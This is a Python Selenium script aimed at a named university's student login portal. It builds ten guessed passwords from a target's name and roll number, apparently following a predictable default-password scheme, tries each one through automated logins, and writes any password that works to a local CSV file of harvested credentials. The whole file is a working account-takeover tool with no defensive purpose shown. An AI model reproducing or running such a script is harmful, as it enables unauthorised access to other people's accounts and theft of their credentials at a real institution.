from selenium import webdriver
from selenium.common import NoSuchElementException
from selenium.webdriver.common.by import By
import pandas
import time

def login(usrn,pswrd):
    driver = webdriver.Chrome()
    driver.get("https://aimsportal.iitbhilai.ac.in/iitbhAims/login/loginHome")
    driver.implicitly_wait(10)
    loginID=driver.find_element(By.XPATH,"//input[@id='uid']")
    loginID.send_keys(usrn)
    driver.implicitly_wait(5)
    password=driver.find_element(By.XPATH,"//input[@id='pswrd']")
    password.send_keys(pswrd)
    driver.implicitly_wait(5)
    SignInButton=driver.find_element(By.XPATH,"//div[@id='login']")
    SignInButton.click()
    #//driver.implicitly_wait(5)
    try:
        captch=driver.find_element(By.XPATH,"//input[@id='captcha']")
        return True
    except NoSuchElementException:
        return False
    finally:
        driver.quit()

Username = input("Enter Username:")
Surname = input("Enter Surname:")
Roll_number = input("Enter Rollno:")
passwords=[]
for i in range(10):
    password = Username[0]+Surname[:len(Surname)-3]+str(i)+str(i)+Username[1]+'24'+str(Roll_number)
    passwords.append(password)
passwordRa = 1
for password in passwords:
   time.sleep(0.1)
   if login(Username,password):
       passwordRa = 0
       df = pandas.read_csv("C:\\Users\\Arpit\\Desktop\\aims\\datas.csv")
       df.loc[len(df.index)] = {'ID':Username,'Password':password}
       df.to_csv("C:\\Users\\Arpit\\Desktop\\aims\\datas.csv",index=False)
       df = df[df.filter(regex='^(?!Unnamed)').columns]
       break


if passwordRa == 1:
    df = pandas.read_csv("C:\\Users\\Arpit\\Desktop\\aims\\datas.csv")
    df.loc[len(df.index)] = {'ID': Username, 'Password': "Smart Ra, Password has been changed."}
    df.to_csv("C:\\Users\\Arpit\\Desktop\\aims\\datas.csv", index=False)
    df = df[df.filter(regex='^(?!Unnamed)').columns]

